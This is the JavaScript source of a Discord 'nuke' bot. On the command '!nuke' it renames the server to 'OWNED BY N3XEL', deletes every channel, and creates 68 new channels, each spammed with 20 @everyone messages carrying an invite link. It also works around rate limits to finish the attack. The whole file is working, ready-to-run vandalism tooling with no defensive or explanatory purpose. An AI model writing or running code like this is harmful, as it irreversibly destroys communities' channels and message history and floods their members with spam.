const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, ActivityType } = require('discord.js');
const TOKEN = process.env.TOKEN;

if (!TOKEN) {
  console.log("BRO WHERE'S THE TOKEN? set it in railway env vars");
  process.exit(1);
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// fancy channel names (no numbers, just letters added later)
const nameBase = [
  "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
  "𝗻𝗶𝗴𝗵𝘁𝗺𝗮𝗿𝗲 𝗶𝘀 𝗵𝗲𝗿𝗲",
  "𝙣𝙞𝙜𝙝𝙩𝙢𝙖𝙧𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚",
  "n̶i̶g̶h̶t̶m̶a̶r̶e̶ i̶s̶ h̶e̶r̶e̶",
  "n̷i̷g̷h̷t̷m̷a̷r̷e̷ i̷s̷ h̷e̷r̷e̷"
];

const spamMsg = `# NUKED BY N3XEL
-# N3XEL ON TOP
https://discord.gg/DyRketGTq
||@everyone||`;

// random 2 letters (no numbers)
function randomSuffix() {
  const chars = 'abcdefghijklmnopqrstuvwxyz';
  return chars[Math.floor(Math.random() * chars.length)] + chars[Math.floor(Math.random() * chars.length)];
}

// parallel execution with concurrency limit
async function runParallel(tasks, concurrency) {
  let idx = 0;
  let results = [];
  async function next() {
    if (idx >= tasks.length) return;
    const i = idx++;
    try {
      results[i] = await tasks[i]();
    } catch(e) { results[i] = e; }
    await next();
  }
  const workers = Array(concurrency).fill().map(() => next());
  await Promise.all(workers);
  return results;
}

// delete all channels fast
async function deleteAllChannels(guild) {
  let channels = [...guild.channels.cache.values()];
  console.log(`DELETING ${channels.length} CHANNELS REAL FAST`);
  let tasks = channels.map(chan => async () => {
    try {
      await chan.delete();
      console.log(`deleted ${chan.name}`);
    } catch(e) {}
  });
  await runParallel(tasks, 15);
  console.log("ALL CHANNELS GONE");
}

// create 68 channels and spam 20 messages each
async function create68ChannelsAndSpam(guild) {
  console.log("CREATING 68 CHANNELS LIKE A MADMAN");
  let tasks = [];
  for (let i = 0; i < 68; i++) {
    let baseName = nameBase[Math.floor(Math.random() * nameBase.length)];
    let uniqueName = baseName + "-" + randomSuffix();
    tasks.push(async () => {
      try {
        let chan = await guild.channels.create({
          name: uniqueName,
          type: ChannelType.GuildText,
          permissionOverwrites: [{
            id: guild.roles.everyone.id,
            allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
          }]
        });
        console.log(`made channel ${uniqueName}`);
        // send 20 messages in parallel
        let msgPromises = [];
        for (let k = 0; k < 20; k++) {
          msgPromises.push(chan.send(spamMsg).catch(err => {
            if (err.code == 429) {
              console.log("rate limited, retrying");
              return new Promise(r => setTimeout(r, err.retryAfter * 1000)).then(() => chan.send(spamMsg));
            }
            return null;
          }));
        }
        await Promise.all(msgPromises);
        console.log(`spammed 20 msgs in ${uniqueName}`);
      } catch(err) {
        if (err.code == 429) {
          console.log("ratelimit on create, waiting a bit");
          await new Promise(r => setTimeout(r, err.retryAfter * 1000));
        } else {
          console.log(`failed to make ${uniqueName}: ${err.message}`);
        }
      }
    });
  }
  await runParallel(tasks, 10);
  console.log("DONE CREATING AND SPAMMING");
}

// main nuke - change server name first
async function nukeServer(guild) {
  console.log(`🔥🔥🔥 NUKING ${guild.name} 🔥🔥🔥`);
  // change server name to OWNED BY N3XEL
  try {
    await guild.setName("OWNED BY N3XEL");
    console.log("changed server name to OWNED BY N3XEL");
  } catch(e) {
    console.log("couldn't change server name: " + e.message);
  }
  await deleteAllChannels(guild);
  await create68ChannelsAndSpam(guild);
  console.log("SERVER IS FUCKED");
}

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  client.user.setPresence({
    status: 'dnd',
    activities: [{ name: '@n3xel', type: ActivityType.Custom, state: '@n3xel' }]
  });
  console.log("status DND with @azairo");
});

client.on('messageCreate', async (msg) => {
  if (msg.author.bot) return;
  if (msg.content.trim() === '!nuke') {
    let guild = msg.guild;
    if (!guild) return msg.reply("this aint a server dumbass");
    await msg.reply("💀 NUKE STARTED - RENAMING SERVER, DELETING EVERYTHING");
    await nukeServer(guild);
  }
});

client.login(TOKEN).catch(e => console.log("login error: " + e.message));
